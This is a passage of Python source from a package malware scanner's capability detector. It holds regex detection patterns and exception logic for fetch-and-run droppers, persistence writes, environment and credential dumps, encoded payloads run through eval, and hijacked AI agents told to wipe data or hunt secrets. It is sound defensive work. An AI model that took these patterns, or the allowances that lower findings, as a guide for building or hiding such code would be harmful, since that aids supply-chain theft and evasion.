                    # A `|` inside quotes is not a pipeline. See `_is_quoted_pipeline`.
                    continue
                if capability is Capability.SPAWN and CapabilityDetector._is_literal_backtick(
                    content, match.start()
                ):
                    # A backtick inside single quotes is a character, not a substitution.
                    # See `_is_literal_backtick`.
                    continue
                if CapabilityDetector._is_declaration(content, match.start(), match.end()):
                    # `export function fetch(` defines a name; it does not call one. See
                    # `DECLARATION` and `SIGNATURE_ARGUMENT`.
                    continue
                if CapabilityDetector._is_example_line(content, match.start()):
                    # A doctest or a shell transcript. See `EXAMPLE_PROMPT`.
                    continue
                if SourceComments.inside_spans(tests, match.start()):
                    # A Rust test module. See `tests` above.
                    continue
                if SourceComments.inside_spans(prose, match.start()):
                    # A Python docstring. See `prose` above.
                    continue
                if (
                    capability is Capability.ANTI_ANALYSIS
                    and delays
                    and content.line_of(match.start()) in delays
                ):
                    # A sleep inside a loop. See `delays` above.
                    continue
                if compiled.rule.id == "CAP.JS.CREDENTIAL.001" and (
                    CapabilityDetector._narrowed_environment(content, match.end())
                ):
                    # The environment enumerated, then cut down to one prefix or handed to a
                    # child process. See `_narrowed_environment`.
                    continue
                if compiled.rule.id == "CAP.ANTI.ENVIRONMENT.001" and (
                    CapabilityDetector._courtesy_gate(content, match.start())
                ):
                    # A CI read beside a user's opt-out or a terminal test. See
                    # `_courtesy_gate`.
                    continue
                if SourceComments.inside_spans(
                    blocks, match.start()
                ) or CapabilityDetector._is_comment(content, match.start(), language):
                    # A comment does not run. `misc/error_handler.func` in
                    # `community-scripts/ProxmoxVE` explains in a comment that
                    # `systemd-detect-virt` reports lxc inside a container, and that
                    # sentence was reported as a check for being observed.
                    continue
                if capability is Capability.EGRESS and (
                    CapabilityDetector._is_local_target(content, match.start())
                    or CapabilityDetector._is_tool_probe(content, match.start())
                ):
                    continue
                if first is None:
                    first = match
                # Distinct *operations*, not distinct occurrences. Ten calls to
                # the same decoder are one decoding step repeated; base64 and
                # then decompression are two, and that difference is what
                # separates an ordinary decode from a chain built to survive
                # each layer of inspection.
                distinct.add(b" ".join(match.group(0).split()))
                if len(distinct) >= MAX_VARIANTS or index >= MAX_MATCHES_EXAMINED:
                    break

            if first is None:
                continue

            # One hit per rule per file. Reporting every occurrence would
            # inflate the evidence without changing any conclusion; the count
            # of distinct operations rides along on the hit instead.
            hits.append(
                CapabilityHit(
                    capability=capability,
                    rule_id=compiled.id,
                    byte_start=first.start(),
                    byte_end=first.end(),
                    line=content.line_of(first.start()),
                    variants=len(distinct),
                )
            )

        return hits

    #: Composites whose severity does not depend on where the code runs. An orchestrator starts
    #: its agent with the checks off on purpose, from its activation code as anywhere; what makes
    #: that an attack is the instruction it carries, which is `MALWARE.AGENT.HIJACK.001`.
    CONTEXT_FREE: ClassVar[frozenset[str]] = frozenset({"SUSPECT.AGENT.UNATTENDED.001"})

    LOOPBACK: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\b(?:127\.0\.0\.1|localhost|0\.0\.0\.0)\b|\[::1\]|['\"]::1['\"]"
    )
    ELSEWHERE: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\b[a-z][a-z0-9+.-]{1,20}://|\b(?:\d{1,3}\.){3}\d{1,3}\b|"
        rb"\b[a-z0-9-]{1,63}\.(?:com|net|org|io|dev|app|xyz|ru|cn|top|me|co|sh|site|online)\b",
        re.IGNORECASE,
    )

    COURTESY_GATE: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\b(?:DO_NOT_TRACK|NO_UPDATE_NOTIFIER|NO_COLOR|FORCE_COLOR|[A-Z0-9_]*TELEMETRY[A-Z0-9_]*"
        rb"|[A-Z0-9_]*_NO_ANALYTICS|[A-Z0-9_]*_DISABLE_(?:ANALYTICS|UPDATE_CHECK|NOTIFIER))\b"
        rb"|\.\s*isTTY\b|\bisatty\s*\("
    )
    """What a CI check asks beside, when it is a courtesy and not an evasion.

    `if (process.env.DO_NOT_TRACK === '1' || process.env.CI) return;` before a licence ping, and
    `if (!process.stderr.isTTY || process.env.CI) return;` before a progress line: 29 of
    `@readystack`'s MCP linters, 37 MCP servers and 139 units of the 200K corpus were blocked as
    code hiding from analysis for these. A payload gated on not being watched has no reason to
    honour the user's opt-out or to care whether a terminal is attached; both are how a program
    is polite, and an evasion that adds one still needs another environment check, a debugger or
    a hostname test, each of which matches on its own.
    """

    SHIPPED_OUTPUT: ClassVar[re.Pattern[str]] = re.compile(
        r"(?:^|/)(?:build|bin|dist)/[^!]{1,400}\.(?:c?js|mjs)$"
    )
    """JavaScript under `build/`, `bin/` or `dist/` in a published npm package.

    In a repository those directories hold the project's own tooling, and a decode beside a
    spawn there is usually a release helper. In the tarball npm installs they are the compiled
    library and the command npm links onto PATH: `@0xengine/meow` shipped `build/validate.js`,
    which writes a base64 script to disk and runs it with bash, and the tooling ceiling held it
    at MEDIUM (review 98).
    """

    @staticmethod
    def _shipped_output(path: str, ctx: ScanContext) -> bool:
        return (
            ctx.package_distribution
            and ctx.distribution == "npm"
            and CapabilityDetector.SHIPPED_OUTPUT.search(path) is not None
        )

    NARROWED_ENVIRONMENT: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\.\s{0,4}filter\s{0,4}\(\s{0,4}\(?\s{0,4}[\w$]{1,20}\s{0,4}\)?\s{0,4}=>\s{0,4}/\^[A-Za-z_]{2,30}"
        rb"|\.\s{0,4}startsWith\s{0,4}\(\s{0,4}[\"'`][A-Za-z][A-Za-z0-9]{1,30}_"
        rb"|\bELECTRON_RUN_AS_NODE\b"
    )
    """What follows an enumeration of `process.env` when it reads one family of variables or
    passes the environment to a child: `Object.keys(process.env).filter(k => /^debug_/i.test(k))`
    is the `debug` package's options, `startsWith("LANGCHAIN_")` is LangChain's configuration,
    and `ELECTRON_RUN_AS_NODE` is vscode-languageclient starting its server. Each is bundled into
    thousands of extensions, and 6 of 8 benign ones blocked as credential theft were these (review
    98). The environment dumped whole, or sent anywhere, still matches."""

    @staticmethod
    def _narrowed_environment(content: FileContent, end: int) -> bool:
        return (
            CapabilityDetector.NARROWED_ENVIRONMENT.search(content.raw[end : end + 160]) is not None
        )

    @staticmethod
    def _courtesy_gate(content: FileContent, offset: int) -> bool:
        raw = content.raw
        start = raw.rfind(b"\n", 0, offset) + 1
        end = raw.find(b"\n", offset)
        line = raw[start : end if end >= 0 else len(raw)]
        return CapabilityDetector.COURTESY_GATE.search(line) is not None

    @staticmethod
    def _loopback_only(region: bytes) -> bool:
        """Whether every destination named in `region` is this machine."""
        if not CapabilityDetector.LOOPBACK.search(region):
            return False
        for found in CapabilityDetector.ELSEWHERE.finditer(region):
            text = found.group(0).lower()
            if text.endswith(b"://"):
                tail = region[found.end() : found.end() + 40].lower()
                if not CapabilityDetector.LOOPBACK.match(tail):
                    return False
            elif text not in (b"127.0.0.1", b"0.0.0.0"):
                return False
        return True

    PERSIST_RULE = "MALWARE.INSTALL.PERSIST.001"
    CALLBACK_RULE = "MALWARE.EXFIL.INSTALL_CALLBACK.001"
    WRITE_NEAR: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"appendFile|writeFile|createWriteStream|\bfs\s*\.\s*write|\.write\s*\(|>>|"
        rb"\btee\s+-a\b|\bechos?\s[^\n]{0,80}>|\bcrontab\s+-|\bsystemctl\s"
    )
    """A write, or the command that installs a unit, close to where persistence is named."""

    FORMULA: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"^class\s+\w+\s*<\s*(?:Portable)?Formula\b", re.MULTILINE
    )

    #: Ruby's ways of writing a file, which a formula would have to use to plant anything.
    RUBY_WRITE: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"\bappend_lines\b|\bwrite\b|\bputs\b|\bFile\s*\.\s*open\b|\batomic_write\b|"
        rb"\bFileUtils\b|\bln_s|\bcp\b|>>"
    )

    @staticmethod
    def _is_formula(content: FileContent) -> bool:
        """A Homebrew formula: Ruby declaring `class Name < Formula`."""
        return content.path.endswith(".rb") and bool(CapabilityDetector.FORMULA.search(content.raw))

    @staticmethod
    def _writes_near(
        content: FileContent,
        hits: list[CapabilityHit],
        reach: int = 160,
        writes: re.Pattern[bytes] | None = None,
    ) -> bool:
        """Whether a persistence location in `hits` is written, not only named."""
        raw = content.raw
        return any(
            (writes or CapabilityDetector.WRITE_NEAR).search(
                raw, max(0, h.byte_start - reach), min(len(raw), h.byte_end + reach)
            )
            for h in hits
            if h.capability is Capability.PERSIST
        )

    #: Fetch-and-run rules whose construct is a command line held in a string: in JavaScript
    #: that is how a command reaches `exec()`, so the quoted-pipeline exception -- written for
    #: install hints like `"curl ... | sh"` -- does not apply to them.
    QUOTED_BY_DESIGN = frozenset({"CAP.JS.COMMAND_FETCH_RUN.001"})

    #: A download written to an executable and started, as one construct: a command line in
    #: JavaScript, or a batch file's download-then-`start`. Not `DOWNLOAD_THEN_RUN`, the data-flow
    #: reading of an HTTP download later spawned -- which is how a legitimate extension fetches its
    #: own language server or CLI.
    DOWNLOAD_RUN_CONSTRUCTS = frozenset(
        {"CAP.JS.COMMAND_FETCH_RUN.001", "CAP.BAT.FETCH_EXEC.001", "CAP.SH.FETCH_EXEC.001"}
    )

    #: Files a person runs to set up a machine, by name or extension: never imported, never run
    #: by a package manager on someone else's behalf.
    HAND_RUN_PROVISIONING_NAMES: ClassVar[frozenset[str]] = frozenset(
        {"vagrantfile", "dockerfile", "containerfile"}
    )
    HAND_RUN_PROVISIONING_SUFFIXES: ClassVar[tuple[str, ...]] = (
        ".sh",
        ".bash",
        ".zsh",
        ".ksh",
        ".ps1",
        ".psm1",
        ".bat",
        ".cmd",
        ".dockerfile",
        ".patch",
        ".diff",
        ".nix",
        ".tpl",
        ".tmpl",
        ".j2",
        ".postinst",
        ".preinst",
        ".chroot",
    )

    #: Prose formats, by name: read by people and renderers, run by nothing.
    PROSE_SUFFIXES: ClassVar[tuple[str, ...]] = (
        ".md",
        ".markdown",
        ".mdx",
        ".rst",
        ".adoc",
        ".asciidoc",
        ".txt",
        ".org",
        ".textile",
    )
    PROSE_NAMES: ClassVar[tuple[str, ...]] = ("readme", "changelog", "contributing", "pkg-info")

    @staticmethod
    def _is_prose(path: str) -> bool:
        name = path.rpartition("!")[2].rpartition("/")[2].lower()
        if name.endswith(CapabilityDetector.PROSE_SUFFIXES):
            return True
        if name == "metadata" and ".dist-info/" in path.lower():
            return True
        stem = name.split(".", 1)[0]
        return stem in CapabilityDetector.PROSE_NAMES and (
            "." not in name or name.endswith(CapabilityDetector.PROSE_SUFFIXES)
        )

    #: The whole environment turned into data: what a client reading its own key never does.
    _ENVIRONMENT_DUMP = re.compile(
        rb"\$\(\s{0,4}(?:env|printenv|set)\s{0,4}\)|`\s{0,4}(?:env|printenv)\s{0,4}`|\bprintenv\b"
        rb"|JSON\.stringify\(\s{0,4}process\.env\s{0,4}[,)]"
        rb"|\b(?:str|repr|json\.dumps)\(\s{0,4}(?:dict\(\s{0,4})?os\.environ\b"
    )

    #: A URL to a public IPv4 address. Loopback, unspecified and private ranges are this machine
    #: or its network -- `allow_origins=["http://127.0.0.1:3000"]` in a server's CORS list names
    #: no destination anything is sent to (review 98, mcp-variants).
    _RAW_IP_URL = re.compile(
        rb"(?i)\b(?:https?|wss?|tcp)://"
        rb"(?!(?:127|10|0)\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)"
        rb"(?:\d{1,3}\.){3}\d{1,3}(?![\d.])"
    )

    @staticmethod
    def _names_untrusted_destination(raw: bytes) -> bool:
        """A paste site, tunnel, webhook catcher or interaction service, or a bare IPv4 URL."""
        from cordon_scanner.intel.hosts import Destinations

        if CapabilityDetector._RAW_IP_URL.search(raw):
            return True
        return (
            Destinations.could_match(raw)
            and Destinations.destination_matcher().search(raw) is not None
        )

    @staticmethod
    def _is_hand_run_provisioning(path: str, language: str | None) -> bool:
        name = path.rpartition("!")[2].rpartition("/")[2].lower()
        return (
            name in CapabilityDetector.HAND_RUN_PROVISIONING_NAMES
            or name.startswith(("dockerfile.", "vagrantfile."))
            or name.endswith(CapabilityDetector.HAND_RUN_PROVISIONING_SUFFIXES)
            or language in ("shell", "powershell", "batch", "dockerfile")
        )

    #: A fetch on the same line as the persistence: `curl ... >> ~/.bashrc`, `wget -O
    #: /etc/systemd/system/x.service`, a crontab line that runs a download.
    _FETCH_VERB = re.compile(
        rb"(?i)\b(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|DownloadString|DownloadFile)\b"
    )

    #: A variable filled by a fetch: `body="$(curl ...)"`, `$r = Invoke-WebRequest ...`.
    _FETCHED_VARIABLE = re.compile(
        rb"(?im)^[ \t]{0,16}(?:export[ \t]{1,4}|local[ \t]{1,4})?\$?([A-Za-z_][A-Za-z0-9_]{0,40})"
        rb"[ \t]{0,4}=[ \t]{0,4}[\"'(]{0,3}(?:\$\(|`)?[ \t]{0,4}(?:curl|wget|Invoke-WebRequest|iwr"
        rb"|Invoke-RestMethod|irm)\b"
    )

    @staticmethod
    def _persists_a_download(content: FileContent, hits: list[CapabilityHit]) -> bool:
        """Whether a line that persists also fetches, or writes out a variable a fetch filled."""
        raw = content.raw
        fetched = {m.group(1) for m in CapabilityDetector._FETCHED_VARIABLE.finditer(raw)}
        for hit in hits:
            if hit.capability is not Capability.PERSIST:
                continue
            start = raw.rfind(b"\n", 0, hit.byte_start) + 1
            end = raw.find(b"\n", hit.byte_end)
            line = raw[start : end if end >= 0 else len(raw)]
            if CapabilityDetector._FETCH_VERB.search(line):
                return True
            if any(re.search(rb"\$\{?" + re.escape(name) + rb"\b", line) for name in fetched):
                return True
        return False

    @staticmethod
    def _runs_a_downloaded_file(hits: list[CapabilityHit]) -> bool:
        return any(hit.rule_id in CapabilityDetector.DOWNLOAD_RUN_CONSTRUCTS for hit in hits)

    #: A payload written into the code, decoded and run in one expression: `eval(atob('...'))`,
    #: `new Function(Buffer.from('...', "base64").toString())`, `exec(base64.b64decode(b'...'))`.
    #: Sixty characters of encoding or more: what a module loader decodes is computed, not written.
    _LITERAL_PAYLOAD_RUN = re.compile(
        rb"(?:\beval|\bnew\s{1,4}Function|\bFunction|\bexec)\s{0,4}\(\s{0,4}"
        rb"(?:atob|Buffer\s{0,4}\.\s{0,4}from|decodeURIComponent\s{0,4}\(\s{0,4}escape\s{0,4}\(\s{0,4}atob"
        rb"|base64\s{0,4}\.\s{0,4}b64decode|codecs\s{0,4}\.\s{0,4}decode)\s{0,4}\(\s{0,4}b?['\"`][A-Za-z0-9+/=_-]{60}"
    )

    #: An agent started with its checks off AND told to destroy or to hunt for secrets.
    AGENT_HIJACK_PARTS: ClassVar[frozenset[str]] = frozenset(
        {"CAP.AGENT.UNATTENDED.001", "CAP.AGENT.HARMFUL_INSTRUCTION.001"}
    )

    @staticmethod
    def _turns_an_agent_on_the_user(hits: list[CapabilityHit]) -> bool:
        """Not lowered for sitting in a bundle: the compromised Amazon Q 1.84.0 shipped the
        command and its wiping prompt in its minified main bundle, which is the only place an
        extension's code is."""
        return {hit.rule_id for hit in hits} >= CapabilityDetector.AGENT_HIJACK_PARTS

    @staticmethod
    def _sends_a_wallet_secret(hits: list[CapabilityHit]) -> bool:
        """Not lowered for sitting in a bundle: the compromised `xrpl` releases sent the seed from
        `dist/` and from their browser build, which is the code a consumer runs."""
        return any(hit.rule_id == "CAP.JS.WALLET_SECRET_SENT" for hit in hits)

    @staticmethod
    def _evaluates_a_literal_payload(content: FileContent) -> bool:
        return CapabilityDetector._LITERAL_PAYLOAD_RUN.search(content.raw) is not None

    #: A line this long means the file was generated, whatever it is called.
    #:
    #: The path globs catch `*.min.js`, `dist/` and `.yarn/releases/`, and they cannot
    #: catch a bundler that names its output with a content hash:
    #: `assets/ToolsPage-COpoWLDm.js` and `assets/index-BTLZFAP9.js` are Vite output and
    #: match no convention a glob can express. A minified bundle contains a decoder
    #: beside an evaluator because that is what a module loader is, so it supplies
    #: `SUSPECT.DECODE_CHAIN.001` and `SUSPECT.DECODE_EXEC.001` by construction.
    #:
    #: Content rather than name is also the harder signal to dodge, which is why the
    #: threshold is generous: a thousand characters on one line is not something
    #: anybody writes by hand, and hand-written code that does is already reported by
    #: `SUSPECT.OBFUSCATION.LONGLINE.001` on its own merits.
    MINIFIED_LINE = 1000

    BUNDLED_SUFFIXES = frozenset(
        {".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".css", ".scss", ".less", ".map"}
    )
    """Extensions where a thousand characters on one line means a bundler ran.

    The ceiling above exists for one reason, stated in `MINIFIED_LINE`: a minified
    bundle contains a decoder beside an evaluator because that is what a module
    loader is. That is a fact about **bundlers**, and bundlers are a JavaScript and
    CSS practice. Nothing in the Python, Ruby, shell, Go or Rust toolchains emits a
    thousand-character line, so in those languages the same measurement means the
    opposite thing -- somebody obfuscated the file by hand.

    Measured, and it is how this was found. `bettercolor` is a real malicious PyPI
    package whose payload is a pyobfuscate blob in a library module: a 12KB `.py`
    file with a 6,307-character line. It matched `_is_minified`, so the ceiling took
    `SUSPECT.DECODE_CHAIN.001` from critical to medium and a CI gate would have
    passed it. Eleven of 201 sampled malicious packages were held below the gate,
    most of them this way.

    A noise ceiling that fires on obfuscated malware is worse than no ceiling: it
    turns a finding a reader would act on into one they will not see."""

    MINIFIED_MEAN_LINE = 200
    """Mean bytes per line before a file is build output rather than source.

    The third half of this test, added after the other two were not enough. A
    minifier's whole purpose is to delete newlines, so its output is one line,
    or three, and the mean line length is most of the file. Hand-written source
    averages nearer forty bytes a line however long its longest line is.

    Without this, one long line anywhere in a `.js` file made the whole file
    "minified output". `budi-kue16-riris` is a registry-spam worm -- generate a
    name, rewrite `package.json`, `exec('npm publish')`, repeat -- and it opens
    with two long array literals of Indonesian names and foods to generate the
    names from. Those two lines bought the entire file a ceiling, and
    `SUSPECT.REGISTRY.SELF_PUBLISH.001` came out at MEDIUM instead of HIGH.
    About thirty packages of that family are in the npm corpus and every one of
    them was under the gate for the same reason.

    The fifth time in this release a ceiling meant for noise was found holding
    malware below the line, and the second time for this particular ceiling."""

    EXFIL_RULES = frozenset({"SUSPECT.EXFIL.001", "MALWARE.EXFIL.001"})
    _URL_HOST = re.compile(r"https?://([a-z0-9.-]{3,253})", re.IGNORECASE)
    SERVICE_HOSTS: ClassVar[dict[str, tuple[str, ...]]] = {
        "GITHUB": ("github.com", "githubusercontent.com", "ghcr.io"),
        "GH": ("github.com", "githubusercontent.com", "ghcr.io"),
        "GITLAB": ("gitlab.com",),
        "NPM": ("npmjs.org", "npmjs.com"),
        "PYPI": ("pypi.org", "pythonhosted.org"),
        "TWINE": ("pypi.org",),
        "HF": ("huggingface.co",),
        "HUGGINGFACE": ("huggingface.co",),
        "DOCKER": ("docker.io", "docker.com"),
        "CODECOV": ("codecov.io",),
        "OPENAI": ("openai.com",),
        "ANTHROPIC": ("anthropic.com",),
        "SLACK": ("slack.com",),
        "SENTRY": ("sentry.io",),
    }

    @classmethod
    def _credential_for_its_own_service(cls, content: FileContent) -> bool:
        """Every credential this Python file reads is handed straight to a call addressed to the
        service the credential is named for.

        lxml's build helper calls `read_url(url, github_api_token=os.environ.get(
        "GITHUB_API_TOKEN"))` with `url` bound to `https://api.github.com/...`: the token goes to
        the service that issued it, which is what a token is for. Judged per read and from the
        call the read is an argument of, never from what else the file contacts -- the same
        build also downloads zlib from `zlib.net`, without the token. A whole-environment read,
        a credential named for no service, or one read that goes anywhere else keeps the
        finding.
        """
        if not content.path.endswith(".py"):
            return False
        try:
            tree = PythonSyntax.shared(content.text)
        except (SyntaxError, ValueError, RecursionError):
            return False

        def environ(node: ast.AST) -> bool:
            return (
                isinstance(node, ast.Attribute)
                and node.attr == "environ"
                and isinstance(node.value, ast.Name)
                and node.value.id == "os"
            )

        parents: dict[int, ast.AST] = {}
        for node in PythonSyntax.nodes(tree):
            for child in ast.iter_child_nodes(node):
                parents[id(child)] = node

        def scope_of(node: ast.AST) -> int:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return id(current) if current is not None else id(tree)

        # Bindings per function: `url` is assigned in many functions of a build script, and
        # the one that matters is the one in the function making the call.
        bound: dict[tuple[int, str], list[ast.AST]] = {}
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        bound.setdefault((scope_of(node), target.id), []).append(node.value)

        def urls_in(call: ast.Call) -> list[str]:
            found: list[str] = []
            for argument in [*call.args, *(k.value for k in call.keywords)]:
                values: list[ast.AST] = [argument]
                key = (scope_of(argument), argument.id) if isinstance(argument, ast.Name) else None
                if key is not None and len(bound.get(key, [])) == 1:
                    values = bound[key]
                for value in values:
                    for inner in PythonSyntax.nodes(value):
                        if isinstance(inner, ast.Constant) and isinstance(inner.value, str):
                            found.extend(
                                m.group(1).lower() for m in cls._URL_HOST.finditer(inner.value)
                            )
            return found

        from cordon_scanner.detect.pyast import PythonAnalyzer

        handed = PythonAnalyzer.excused_lines(content.text).get(Capability.CREDENTIAL, frozenset())
        reads = 0
        for node in PythonSyntax.nodes(tree):
            key: str | None = None
            if (
                environ(node)
                and not isinstance(parents.get(id(node)), ast.Subscript | ast.Attribute)
                and getattr(node, "lineno", 0) not in handed
            ):
                return False  # the environment as a whole, other than handed to a child
            if isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.Constant):
                func = node.func
                if (
                    isinstance(func, ast.Attribute) and func.attr == "get" and environ(func.value)
                ) or (isinstance(func, ast.Attribute) and func.attr == "getenv"):
                    key = str(node.args[0].value)
            elif (
                isinstance(node, ast.Subscript)
                and environ(node.value)
                and isinstance(node.slice, ast.Constant)
            ):
                key = str(node.slice.value)
            if key is None or not CREDENTIAL_VARIABLE.search(key):
                continue
            reads += 1
            service = next(
                (
                    domains
                    for prefix, domains in cls.SERVICE_HOSTS.items()
                    if key.upper() == prefix or key.upper().startswith(prefix + "_")
                ),
                None,
            )
            carrier = parents.get(id(node))
            while isinstance(
                carrier,
                ast.keyword
                | ast.BinOp
                | ast.JoinedStr
                | ast.FormattedValue
                | ast.BoolOp
                | ast.Dict,
            ):
                carrier = parents.get(id(carrier))
            if service is None or not isinstance(carrier, ast.Call):
                return False
            hosts = urls_in(carrier)
            if not hosts or not all(
                any(h == d or h.endswith("." + d) for d in service) for h in hosts
            ):
                return False
        return reads > 0

    RUNNERS = frozenset(
        {
            "atexit.register",
            "Thread",
            "Timer",
            "Process",
            "signal.signal",
            "start_new_thread",
            "execute",
        }
    )
    """Callees that run a function they are handed, without anybody asking again."""

    ON_REQUEST_RULES = frozenset(
        {
            "SUSPECT.DROPPER.001",
            "SUSPECT.DYNAMIC_DISPATCH.001",
            "SUSPECT.EXFIL.BEACON.001",
            "SUSPECT.ANTI_ANALYSIS.001",
            "SUSPECT.DECODE_EXEC.001",
            "SUSPECT.MODEL.LOADED_ON_IMPORT.001",
            "SUSPECT.PERSIST.001",
        }
    )
    """Composites lowered when nothing on the load path runs them. A dynamic import in the method
    of a YAML library that resolves `!!python/name:` tags is that library's feature, and a
    function that checks for GitHub Actions before minting its OIDC token is doing its job; the
    same code at a module's top level, or in a hook, is not lowered."""
    DEFINITION_TIME_DUNDERS = frozenset(
        {"__init_subclass__", "__set_name__", "__class_getitem__", "__prepare__", "__new__"}
    )
    """Dunders that run when a class is defined, subclassed or parameterised, not when it is
    instantiated. `__new__` is here because a metaclass's `__new__` runs at class definition."""
    SCRIPT_LANGUAGES_RUN_BY_HAND = frozenset(
        {"shell", "powershell", "batch", "dockerfile", "makefile"}
    )

    @staticmethod
    def _drop_excused_pattern_hits(
        content: FileContent, hits: list[CapabilityHit]
    ) -> list[CapabilityHit]:
        """Pattern hits on lines the syntax tree shows to be harmless. See
        `PythonAnalyzer.excused_lines`."""
        from bisect import bisect_right

        from cordon_scanner.detect.pyast import PythonAnalyzer

        excused = PythonAnalyzer.excused_lines(content.text)
        if not any(excused.values()):
            return hits
        starts = content.line_starts

        def line_of(hit: CapabilityHit) -> int:
            return hit.line or bisect_right(starts, hit.byte_start)

        return [
            h
            for h in hits
            if line_of(h) not in excused.get(h.capability, frozenset())
            and line_of(h) not in excused.get(h.rule_id, frozenset())
        ]

    DROPPER_RULE = "SUSPECT.DROPPER.001"

    #: Rules whose act is destroying data. They keep their severity in build tooling: a recipe
    #: runs unattended on every machine that builds, so "written to be read" does not hold.
    DESTRUCTION_RULES: ClassVar[frozenset[str]] = frozenset(
        {"SUSPECT.DESTROY.HOME_OR_ROOT.001", "MALWARE.PROTESTWARE.001"}
    )

    @staticmethod
    def _official_installs_only(content: FileContent, hits: list[CapabilityHit]) -> bool:
        """Every fetch-and-run in the file names a listed official installer, and nothing is
        decoded: storybook's script runs `curl -LsSf https://astral.sh/uv/install.sh | sh`, the
        documented way to install uv."""
        from cordon_scanner.intel.installers import OfficialInstallers

        if any(h.capability is Capability.DECODE for h in hits):
            return False
        fetches = [h for h in hits if h.capability is Capability.FETCH_EXEC]
        if not fetches:
            return False
        text = content.raw
        return all(
            OfficialInstallers.is_official_installer(
                text[h.byte_start : h.byte_end + 300].decode("utf-8", "replace")
            )
            for h in fetches
        )

    #: The two grades of the same dropper pattern, the only findings `VerifiedDownload` may lower.
    VERIFIABLE_DROPPERS: ClassVar[frozenset[str]] = frozenset(
        {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"}
    )
    VERIFIED_DOWNLOAD_REASON = (
        "a checksum-verified download of the package's own release; whoever owns the release "
        "also owns the checksum, so the binary itself is not vouched for"
    )

    @staticmethod
    def _verified_release_download(
        unit: FileUnit, ctx: ScanContext, file_hits: list[CapabilityHit]
    ) -> bool:
        from cordon_scanner.detect.verified_download import VerifiedDownload

        if not ctx.package_distribution:
            # Condition (b) places the digest in the package, and only a published package's
            # members are known to be what the consumer receives beside the script.
            return False
        return VerifiedDownload.verified(
            unit.content.text,
            unit.language,
            unit.content.path,
            file_hits,
            ctx.tree_paths,
            # Condition (c), the package's own `repository` (`ScanContext.package_repository`):
            # a release on github.com is the package's only if its owner and repository match.
            # Hosts with no owner in the path (the npm registries, nodejs.org) do not need it.
            ctx.package_repository or None,
        ) or VerifiedDownload.own_release(
            unit.content.text, unit.language, file_hits, ctx.package_repository or None
        )

    def _suspect_dropper_reports(
        self, ctx: ScanContext, path: str, hits: list[CapabilityHit]
    ) -> bool:
        """Whether `SUSPECT.DROPPER.001` fires on the window `MALWARE.DROPPER.001` matched: its
        `unless` excludes test paths, and withdrawing the one where the other does not report
        would leave the file clean."""
        suspect = ctx.rules.get(self.DROPPER_RULE)
        return suspect is not None and self._evaluate(
            suspect, {hit.capability for hit in hits}, path, in_hook=True
        )

    _SKILL_SCRIPT = re.compile(
        r"(?:^|/)skills/[^/\n]{1,200}/[^\n]{0,400}\.(?:py|js|mjs|cjs|ts|sh|bash|ps1|rb)$"
    )
    """A file inside an agent skill's folder (`.claude/skills/<name>/scripts/x.py` and kin)."""

    @staticmethod
    def _skill_script(path: str, ctx: ScanContext | None) -> bool:
        """A script an agent skill ships: under a `skills/<name>/` folder, or beside or below a
        `SKILL.md` -- a skill unpacked on its own, from a marketplace or an archive, has no
        `skills/` parent and is still run by the agent whenever the skill is invoked."""
        if CapabilityDetector._SKILL_SCRIPT.search(path.rpartition("!")[2]):
            return True
        if ctx is None or not path.lower().endswith(CapabilityDetector.SKILL_SCRIPT_SUFFIXES):
            return False
        parts = path.split("/")[:-1]
        return any(
            "/".join([*parts[:depth], "SKILL.md"]) in ctx.tree_paths
            for depth in range(len(parts), max(-1, len(parts) - 4), -1)
        )

    SKILL_SCRIPT_SUFFIXES = (".py", ".js", ".mjs", ".cjs", ".ts", ".sh", ".bash", ".ps1", ".rb")

    @staticmethod
    def _agent_run(content: FileContent, ctx: ScanContext | None) -> bool:
        """A skill's script or an MCP server's own source: code an agent runs as a tool."""
        if CapabilityDetector._skill_script(content.path, ctx):
            return True
        if ctx is not None and content.path in ctx.agent_run_paths:
            return True
        from cordon_scanner.core.engine import Engine

        member = content.path.rpartition("!")[2]
        return (
            member.endswith((".js", ".mjs", ".cjs", ".ts", ".mts", ".py"))
            and not Engine._NOT_A_SERVER_PATH.search(member)
            and Engine._MCP_SDK_IMPORT.search(content.text[:200_000]) is not None
        )

    ON_REQUEST_REASONS = (
        "a script a person runs, not code that runs on its own",
        "function bodies that run only when called",
        "compiled code that runs when the program is run, not when it is imported",
    )
    COMPILED_LANGUAGES = frozenset(
        {"go", "java", "kotlin", "csharp", "rust", "swift", "c", "cpp", "scala"}
    )
    """Languages with no load path: importing a Go package or referencing a Java class runs none of
    its functions, except the initialisers matched by `_LOAD_TIME_INITIALISER`."""
    _LOAD_TIME_INITIALISER = re.compile(
        r"^[ \t]{0,8}func[ \t]+init[ \t]*\([ \t]*\)[ \t]*\{|^[ \t]{0,40}static[ \t]*\{"
        r"|^[ \t]{0,40}static[ \t]+[A-Z]\w{0,80}[ \t]*\([ \t]*\)[ \t]*\{"
        # C and C++ library constructors, and Rust's `#[ctor]`: run when the library is loaded.
        r"|__attribute__[ \t]{0,4}\(\([ \t]{0,4}constructor[^{;]{0,300}\{"
        r"|#\[ctor\][ \t\r\n]{0,40}(?:pub[ \t]{1,4})?(?:unsafe[ \t]{1,4})?fn[ \t]+\w{1,80}[ \t]*\([^)]{0,200}\)[^{;]{0,100}\{",
        re.MULTILINE,
    )
    """Go's `func init()`, Java's `static { ... }`, a C# static constructor, a C/C++
    `__attribute__((constructor))` and Rust's `#[ctor]`: code that runs when the package is imported,
    the class is loaded or the library is mapped -- how malicious modules run their payload."""
    _JS_BODY_OPENER = re.compile(
        r"(?:\bfunction\b[^{;]{0,300}|=>[ \t]{0,8}|^[ \t]{0,40}(?:(?:async|static|get|set|public|private|protected)"
